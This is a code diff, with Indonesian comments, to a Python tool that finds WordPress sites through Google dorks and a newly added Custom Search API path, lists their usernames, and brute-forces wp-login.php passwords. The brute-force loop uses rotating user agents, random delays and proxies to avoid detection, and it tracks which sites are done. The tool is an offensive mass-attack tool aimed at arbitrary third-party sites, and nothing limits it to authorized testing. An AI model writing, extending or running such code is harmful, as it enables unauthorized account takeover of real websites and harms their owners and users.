@@ -13,7 +13,7 @@ import platform
 import subprocess
 
 from pathlib import Path
-from typing import List, Optional, Tuple, Set
+from typing import List, Optional, Tuple, Set, Dict, Any
 
 # ──────────────────────────────────────────────────────────────────────────────
 # OPTIONAL DEPENDENCY: googlesearch
@@ -101,7 +101,7 @@ def find_targets_from_dork(dork: str, limit: int) -> List[str]:
         sys.exit(1)
     scanned = read_scanned()
     fetch_count = limit + len(scanned)
-    logging.info("Mencari target via Google dork '%s' (skip %d yg sudah diproses)", dork, len(scanned))
+    logging.info("Mencari target via Google dork '%s' (skip %d sudah diproses)", dork, len(scanned))
     raw: List[str] = []
     for url in search(dork, fetch_count):
         time.sleep(1)
@@ -112,6 +112,43 @@ def find_targets_from_dork(dork: str, limit: int) -> List[str]:
                 raw.append(root)
     new_targets = [t for t in raw if t not in scanned][:limit]
     logging.info("Ditemukan %d target baru", len(new_targets))
+    return new_targets
+
+def find_targets_via_api(dork: str, limit: int, api_key: str, cx: str) -> List[str]:
+    scanned = read_scanned()
+    results: List[str] = []
+    # CSE API hanya num<=10, jadi pecah panggilan jika perlu
+    to_fetch = limit + len(scanned)
+    starts = [1]
+    if to_fetch > 10:
+        starts.append(11)
+    for start in starts:
+        num = min(to_fetch - (start-1), 10)
+        params = {
+            "key": api_key,
+            "cx": cx,
+            "q": dork,
+            "start": start,
+            "num": num
+        }
+        try:
+            r = requests.get("https://www.googleapis.com/customsearch/v1", params=params, timeout=10)
+            items = r.json().get("items", [])
+        except Exception as e:
+            logging.error("API CSE gagal: %s", e)
+            break
+        for it in items:
+            link = it.get("link") or ""
+            m = re.match(r"https?://[^/]+", link)
+            if m:
+                root = m.group(0)
+                if root not in results:
+                    results.append(root)
+        if len(results) >= to_fetch:
+            break
+    # filter dan ambil limit
+    new_targets = [t for t in results if t not in scanned][:limit]
+    logging.info("API CSE: ditemukan %d target baru", len(new_targets))
     return new_targets
 
 def get_usernames(target_url: str, timeout: float) -> List[str]:
@@ -185,19 +222,15 @@ def bruteforce_wp(
     try:
         for idx in range(start, total):
             pwd = passwords[idx]
-            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}", end="", flush=True)
+            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}",
+                  end="", flush=True)
             time.sleep(random.uniform(*delay_range))
             try:
                 r = session.post(
                     login_url,
-                    data={
-                        "log": username, "pwd": pwd,
-                        "wp-submit": "Log In",
-                        "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
-                        "testcookie": "1"
-                    },
-                    timeout=timeout,
-                    allow_redirects=True,
+                    data={"log":username,"pwd":pwd,"wp-submit":"Log In",
+                          "redirect_to":f"{target_url.rstrip('/')}/wp-admin/","testcookie":"1"},
+                    timeout=timeout, allow_redirects=True,
                     headers={"User-Agent": random.choice(USER_AGENTS)},
                     proxies=proxies
                 )
@@ -242,13 +275,19 @@ def main():
     p.add_argument("--debug",    action="store_true", help="Debug output")
     p.add_argument("--dork",     help="Google dork (inurl:wp-login.php site:...)")
     p.add_argument("--limit",    type=int, default=15, help="Maks hasil Google dork")
+    # tambahan untuk API
+    p.add_argument("--api-key",  help="Google CSE API key")
+    p.add_argument("--cx",       help="Google CSE CX ID")
     args = p.parse_args()
 
     setup_logging(Path(args.log_file) if args.log_file else None, args.debug)
 
     # build targets list
     if args.dork:
-        targets = find_targets_from_dork(args.dork, args.limit)
+        if args.api_key and args.cx:
+            targets = find_targets_via_api(args.dork, args.limit, args.api_key, args.cx)
+        else:
+            targets = find_targets_from_dork(args.dork, args.limit)
     else:
         targets = [args.target.rstrip('/')]
 
@@ -259,17 +298,16 @@ def main():
         logging.error("Wordlist tidak ditemukan: %s", args.wordlist)
         sys.exit(1)
 
-    # ────────── perbaikan di loop utama ──────────
     for tgt in targets:
         logging.info("=== Memproses target: %s ===", tgt)
 
-        # 1) Enum username dulu
+        # enumeration username
         if args.username:
             user = args.username
         else:
             users = get_usernames(tgt, args.timeout)
             if not users:
-                logging.warning("Skip %s: tidak ada user ditemukan via REST/API.", tgt)
+                logging.warning("Skip %s: tidak ada user ditemukan.", tgt)
                 append_scanned(tgt)
                 continue
             user = pilih_username(users)
@@ -278,7 +316,7 @@ def main():
                 append_scanned(tgt)
                 continue
 
-        # 2) Baru cek wp-login.php
+        # cek wp-login.php
         login_url = f"{tgt.rstrip('/')}/wp-login.php"
         try:
             h = requests.head(login_url, timeout=5,
@@ -292,7 +330,7 @@ def main():
             append_scanned(tgt)
             continue
 
-        # 3) Lanjut brute-force
+        # brute-force
         logging.info("Brute-force %s di %s (%d pwd)", user, tgt, len(pwds))
         found = bruteforce_wp(
             target_url  = tgt,
